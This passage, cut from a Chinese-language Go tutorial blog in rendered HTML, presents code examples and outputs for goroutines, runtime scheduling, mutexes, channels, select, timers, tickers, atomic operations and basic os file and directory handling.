class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">		<span class="keyword">go</span> showMsg(i) <span class="comment">// 启动10个协程来执行</span></span><br><span class="line">		wg.Add(<span class="number">1</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	wg.Wait()</span><br><span class="line">	<span class="comment">// 因为主协程运行完之后就会关闭程序，其他线程没有运行完会直接终止</span></span><br><span class="line">	<span class="comment">// 所以如果有需要让其他协程执行完需要加waitgroup进行等待</span></span><br><span class="line">	fmt.Println(<span class="string">&quot;end&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果，不唯一</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">i: 0</span><br><span class="line">i: 9</span><br><span class="line">i: 4</span><br><span class="line">i: 1</span><br><span class="line">i: 5</span><br><span class="line">i: 6</span><br><span class="line">i: 7</span><br><span class="line">i: 8</span><br><span class="line">i: 2</span><br><span class="line">i: 3</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<h3 id="runtime">1.10.4. runtime</h3><ul>
<li>Gosched：让当前线程让出 cpu 以让其它线程运行,它不会挂起当前线程，因此当前线程未来会继续执行</li>
<li>NumCPU：返回当前系统的 CPU 核数量</li>
<li>GOMAXPROCS：设置最大的可同时使用的 CPU 核数</li>
<li>Goexit：退出当前 goroutine(但是defer语句会照常执行)</li>
<li>NumGoroutine：返回正在执行和排队的任务总数</li>
<li>GOOS：目标操作系统</li>
</ul>
<h4 id="runtime-Gosched">1.10.4.1. runtime.Gosched()</h4><p>前</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">showMsg</span><span class="params">(msg <span class="type">string</span>)</span></span> &#123;</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">2</span>; i++ &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;msg: %v\n&quot;</span>, msg)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">go</span> showMsg(<span class="string">&quot;golang&quot;</span>) <span class="comment">// 主线程执行结束后，直接退出，有概率不执行该携程内容</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">2</span>; i++ &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;msg:%v\n&quot;</span>, <span class="string">&quot; java&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msg: java</span><br><span class="line">msg: java</span><br><span class="line">msg: golang</span><br></pre></td></tr></table></figure>

<p>后</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;runtime&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">showMsg</span><span class="params">(msg <span class="type">string</span>)</span></span> &#123;</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">2</span>; i++ &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;msg: %v\n&quot;</span>, msg)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">go</span> showMsg(<span class="string">&quot;golang&quot;</span>)</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">2</span>; i++ &#123;</span><br><span class="line">		runtime.Gosched() <span class="comment">// 让当前线程让出 cpu 以让其它线程运行,它不会挂起当前线程，因此当前线程未来会继续执行</span></span><br><span class="line">		fmt.Printf(<span class="string">&quot;msg:%v\n&quot;</span>, <span class="string">&quot; java&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果，不唯一</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msg: golang</span><br><span class="line">msg: golang</span><br><span class="line">msg: java</span><br><span class="line">msg: java</span><br></pre></td></tr></table></figure>

<h4 id="runtime-Goexit">1.10.4.2. runtime.Goexit()</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;runtime&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">show</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">		fmt.Println(i)</span><br><span class="line">		<span class="keyword">if</span> i == <span class="number">5</span> &#123;</span><br><span class="line">			runtime.Goexit()</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">go</span> show()</span><br><span class="line">	runtime.Gosched()</span><br><span class="line">	fmt.Println(<span class="string">&quot;end..&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">end..</span><br></pre></td></tr></table></figure>

<h3 id="mutex">1.10.5. mutex</h3><h4 id="实例1-1">1.10.5.1. 实例1</h4><p>前</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 多个携程在操作统一资源的时候，会有概率导致数据异常</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> num <span class="type">int</span> = <span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">a</span><span class="params">()</span></span> &#123;</span><br><span class="line">	num += <span class="number">1</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;num++:%v\n&quot;</span>, num)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">b</span><span class="params">()</span></span> &#123;</span><br><span class="line">	num -= <span class="number">1</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;num--:%v\n&quot;</span>, num)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">50</span>; i++ &#123;</span><br><span class="line">		<span class="keyword">go</span> a()</span><br><span class="line">		<span class="keyword">go</span> b()</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;end &gt;&gt; num: %v\n&quot;</span>, num)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221128110422810.png" alt="image-20221128110422810"></p>
<p>后</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;sync&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 多个携程在操作统一资源的时候，会有概率导致数据异常</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> num <span class="type">int</span> = <span class="number">100</span></span><br><span class="line"><span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line"><span class="keyword">var</span> lock sync.Mutex <span class="comment">// 互斥锁</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">add</span><span class="params">()</span></span> &#123;</span><br><span class="line">	lock.Lock()</span><br><span class="line">	<span class="keyword">defer</span> wg.Done()</span><br><span class="line">	num += <span class="number">1</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;add: %v\n&quot;</span>, num)</span><br><span class="line">	lock.Unlock()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sub</span><span class="params">()</span></span> &#123;</span><br><span class="line">	lock.Lock()</span><br><span class="line">	<span class="keyword">defer</span> wg.Done()</span><br><span class="line">	num -= <span class="number">1</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;sub: %v\n&quot;</span>, num)</span><br><span class="line">	lock.Unlock()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">50</span>; i++ &#123;</span><br><span class="line">		wg.Add(<span class="number">1</span>)</span><br><span class="line">		<span class="keyword">go</span> add()</span><br><span class="line">		wg.Add(<span class="number">1</span>)</span><br><span class="line">		<span class="keyword">go</span> sub()</span><br><span class="line">	&#125;</span><br><span class="line">	wg.Wait()</span><br><span class="line">	fmt.Printf(<span class="string">&quot;num: %v\n&quot;</span>, num)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>输出结果:</p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221203155301238.png" alt="image-20221203155301238"></p>
<h3 id="channel的遍历">1.10.6. channel的遍历</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> c = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 如果写入的数量&gt;读的数量，不会产生异常</span></span><br><span class="line">	<span class="comment">/* go func() &#123;</span></span><br><span class="line"><span class="comment">		for i := 0; i &lt; 10; i++ &#123;</span></span><br><span class="line"><span class="comment">			c &lt;- i</span></span><br><span class="line"><span class="comment">		&#125;</span></span><br><span class="line"><span class="comment">	&#125;() */</span></span><br><span class="line">	<span class="comment">// 若读的数量&gt;写的数量,会报错deadlock死锁</span></span><br><span class="line">	<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">2</span>; i++ &#123;</span><br><span class="line">			c &lt;- i</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//通过关闭通道解决,后续没有读取的就是默认值</span></span><br><span class="line">		<span class="built_in">close</span>(c)</span><br><span class="line">	&#125;()</span><br><span class="line">	<span class="comment">/* r := &lt;-c</span></span><br><span class="line"><span class="comment">	fmt.Printf(&quot;r: %v\n&quot;, r)</span></span><br><span class="line"><span class="comment">	r = &lt;-c</span></span><br><span class="line"><span class="comment">	fmt.Printf(&quot;r: %v\n&quot;, r)</span></span><br><span class="line"><span class="comment">	r = &lt;-c</span></span><br><span class="line"><span class="comment">	fmt.Printf(&quot;r: %v\n&quot;, r) //第三次读取时:fatal error: all goroutines are asleep - deadlock! */</span></span><br><span class="line">	<span class="comment">// 通过for循环遍历channel</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">5</span>; i++ &#123;</span><br><span class="line">		r := &lt;-c</span><br><span class="line">		fmt.Printf(<span class="string">&quot;r: %v\n&quot;</span>, r)</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">// 通过for range遍历</span></span><br><span class="line">    <span class="keyword">for</span> v := <span class="keyword">range</span> c &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;v: %v\n&quot;</span>, v)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 注意: 再遍历channel之前一定要把channel先关闭了，不然程度不会退出</span></span><br></pre></td></tr></table></figure>

<h3 id="select">1.10.7. select</h3><p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221204151826443.png" alt="image-20221204151826443"></p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> chanInt = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br><span class="line"><span class="keyword">var</span> chanStr = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">string</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		chanInt &lt;- <span class="number">100</span></span><br><span class="line">		chanStr &lt;- <span class="string">&quot;hello&quot;</span></span><br><span class="line">		<span class="built_in">close</span>(chanInt)</span><br><span class="line">		<span class="built_in">close</span>(chanStr)</span><br><span class="line">	&#125;()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		<span class="keyword">select</span> &#123;</span><br><span class="line">		<span class="keyword">case</span> r := &lt;-chanInt:</span><br><span class="line">			fmt.Printf(<span class="string">&quot;r: %v\n&quot;</span>, r)</span><br><span class="line">		<span class="keyword">case</span> r := &lt;-chanStr:</span><br><span class="line">			fmt.Printf(<span class="string">&quot;r: %v\n&quot;</span>, r)</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			fmt.Printf(<span class="string">&quot;\&quot;end\&quot;: %v\n&quot;</span>, <span class="string">&quot;end&quot;</span>)</span><br><span class="line">		&#125;</span><br><span class="line">		time.Sleep(time.Second)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果</p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221204152820505.png" alt="image-20221204152820505"></p>
<h3 id="timer">1.10.8. timer</h3><p>Timer顾名思义，就是定时器的意思，可以实现一些定时操作，内部也是通过chanmel来实现的.</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">/* timer := time.NewTimer(time.Second * 2)</span></span><br><span class="line"><span class="comment">	fmt.Printf(&quot;time.Now(): %v\n&quot;, time.Now()) // time.Now()打印当前时间 */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* t1 := &lt;-timer.C                         // timer.C为channel, 获取阻塞后的时间</span></span><br><span class="line"><span class="comment">	fmt.Printf(&quot;t1: %v\n&quot;, t1) */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* &lt;-timer.C							  // 与上面方法结果相同</span></span><br><span class="line"><span class="comment">	fmt.Printf(&quot;time.Now(): %v\n&quot;, time.Now()) */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* fmt.Printf(&quot;time.Now(): %v\n&quot;, time.Now())</span></span><br><span class="line"><span class="comment">	timer := time.NewTimer(time.Second * 10)</span></span><br><span class="line"><span class="comment">	timer.Stop() // timer.stop()停止计时器</span></span><br><span class="line"><span class="comment">	fmt.Printf(&quot;time.Now(): %v\n&quot;, time.Now()) */</span></span><br><span class="line"></span><br><span class="line">	fmt.Printf(<span class="string">&quot;time.Now(): %v\n&quot;</span>, time.Now())</span><br><span class="line">	timer := time.NewTimer(time.Second * <span class="number">10</span>)</span><br><span class="line">	timer.Reset(time.Second * <span class="number">2</span>) <span class="comment">// timer.Reset()重新设置计时器</span></span><br><span class="line">	&lt;-timer.C</span><br><span class="line">	fmt.Printf(<span class="string">&quot;time.Now(): %v\n&quot;</span>, time.Now())</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ticker">1.10.9. ticker</h3><p>timer只执行一次,ticker可以周期执行</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	ticker := time.NewTicker(time.Second)</span><br><span class="line">	counter := <span class="number">1</span></span><br><span class="line">	<span class="keyword">for</span> _ = <span class="keyword">range</span> ticker.C &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;ticker...&quot;</span>)</span><br><span class="line">		counter++</span><br><span class="line">		<span class="keyword">if</span> counter &gt; <span class="number">5</span> &#123;</span><br><span class="line">			ticker.Stop()</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;end...&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">[Running] <span class="keyword">go</span> run <span class="string">&quot;d:\MyCode\Go\src\并发\ticker.go&quot;</span></span><br><span class="line">ticker...</span><br><span class="line">ticker...</span><br><span class="line">ticker...</span><br><span class="line">ticker...</span><br><span class="line">ticker...</span><br><span class="line">end...</span><br><span class="line"></span><br><span class="line">[Done] exited with code=<span class="number">0</span> in <span class="number">5.633</span> seconds</span><br></pre></td></tr></table></figure>

<h3 id="atomic原子变量">1.10.10. atomic原子变量</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;sync/atomic&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> i <span class="type">int32</span> = <span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">add</span><span class="params">()</span></span> &#123;</span><br><span class="line">	atomic.AddInt32(&amp;i, <span class="number">1</span>) <span class="comment">// 等同于mutex互斥锁,会匹配旧的值与将要替换的新值，如果匹配失败则不会替换，保证线程安全</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sub</span><span class="params">()</span></span> &#123;</span><br><span class="line">	atomic.AddInt32(&amp;i, <span class="number">-1</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;原子变量测试&quot;</span>)</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">100</span>; i++ &#123;</span><br><span class="line">		<span class="keyword">go</span> add()</span><br><span class="line">		<span class="keyword">go</span> sub()</span><br><span class="line">	&#125;</span><br><span class="line">	time.Sleep(time.Second * <span class="number">2</span>)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;i: %v\n&quot;</span>, i)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="原子操作详解">1.10.11. 原子操作详解</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;sync/atomic&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">test_add_sub</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> i <span class="type">int32</span> = <span class="number">100</span></span><br><span class="line">	atomic.AddInt32(&amp;i, <span class="number">1</span>)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;i: %v\n&quot;</span>, i)</span><br><span class="line">	atomic.AddInt32(&amp;i, <span class="number">-1</span>)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;i: %v\n&quot;</span>, i)</span><br><span class="line">	fmt.Println(<span class="string">&quot;==========================================&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">test_load_read</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> i <span class="type">int32</span> = <span class="number">100</span></span><br><span class="line">	atomic.LoadInt32(&amp;i) <span class="comment">// 载入read</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;i: %v\n&quot;</span>, i)</span><br><span class="line">	atomic.StoreInt32(&amp;i, <span class="number">200</span>) <span class="comment">// 写入write</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;i: %v\n&quot;</span>, i)</span><br><span class="line">	fmt.Println(<span class="string">&quot;==========================================&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">test_cas</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> i <span class="type">int32</span> = <span class="number">100</span></span><br><span class="line">	b := atomic.CompareAndSwapInt32(&amp;i, <span class="number">100</span>, <span class="number">200</span>) <span class="comment">// 判断数据是否交换成功，返回的是布尔类型的值</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;b: %v\n&quot;</span>, b)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;i: %v\n&quot;</span>, i)</span><br><span class="line">	fmt.Println(<span class="string">&quot;==========================================&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	test_add_sub()   <span class="comment">// 增减</span></span><br><span class="line">	test_load_read() <span class="comment">// 读写</span></span><br><span class="line">	test_cas()       <span class="comment">// 数据交换</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="OS">1.11. OS</h2><h3 id="文件目录操作">1.11.1. 文件目录操作</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建文件</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">createFile</span><span class="params">()</span></span> &#123;</span><br><span class="line">	f, err := os.Create(<span class="string">&quot;a.txt&quot;</span>) <span class="comment">// f 返回的是一个文件对象，可以通过.调用其中的方法</span></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;err: %v\n&quot;</span>, err)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;f.Name(): %v\n&quot;</span>, f.Name()) <span class="comment">// 获取创建的文件名</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建目录</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">createDir</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 创建单个目录</span></span><br><span class="line">	err := os.Mkdir(<span class="string">&quot;test&quot;</span>, os.ModePerm) <span class="comment">// &quot;test&quot;代表创建的文件夹名称，os.ModePerm代表文件权限为最高</span></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;err: %v\n&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 创建多级目录</span></span><br><span class="line">	err2 := os.MkdirAll(<span class="string">&quot;test1/a/b&quot;</span>, os.ModePerm)</span><br><span class="line">	<span class="keyword">if</span> err2 != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;err2: %v\n&quot;</span>, err2)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除文件或文件夹</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">removeFile</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 删除文件</span></span><br><span class="line">	err := os.Remove(<span class="string">&quot;a.txt&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;err: %v\n&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 删除文件夹及其目录下的文件</span></span><br><span class="line">	err2 := os.RemoveAll(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err2 != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;err2: %v\n&quot;</span>, err2)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获得工作目录</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getPwd</span><span class="params">()</span></span> &#123;</span><br><span class="line">	dir, err := os.Getwd() <span class="comment">// 获取当前工作目录</span></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;err: %v\n&quot;</span>, err)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;dir: %v\n&quot;</span>, dir)</span><br><span class="line">	&#125;</span><br><span class="line">	s := os.TempDir() <span class="comment">// 获取临时目录</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;s: %v\n&quot;</span>, s)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 重命名文件</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">rename</span><span class="params">()</span></span> &#123;</span><br><span class="line">	err := os.Rename(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test1.txt&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;err: %v\n&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读文件</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">readFile</span><span class="params">()</span></span> &#123;</span><br><span class="line">	b, err := os.ReadFile(<span class="string">&quot;test1.txt&quot;</span>) <span class="comment">// b为内容的字节数组实际是切片 格式如-&gt;b: [104 101 108 108 111 32 119 111 114 108 100]</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;err: %v\n&quot;</span>, err)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;b: %v\n&quot;</span>, <span class="type">string</span>(b[:])) <span class="comment">// 文件读取的输出形式为byte切片，需要转为string类型读取</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写文件</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">writeFile</span><span class="params">()</span></span> &#123;</span><br><span class="line">	err := os.WriteFile(<span class="string">&quot;test1.txt&quot;</span>, []<span class="type">byte</span>(<span class="string">&quot;not good&quot;</span>), os.ModePerm) <span class="comment">// 已二进制形式覆盖写入</span></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;err: %v\n&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span 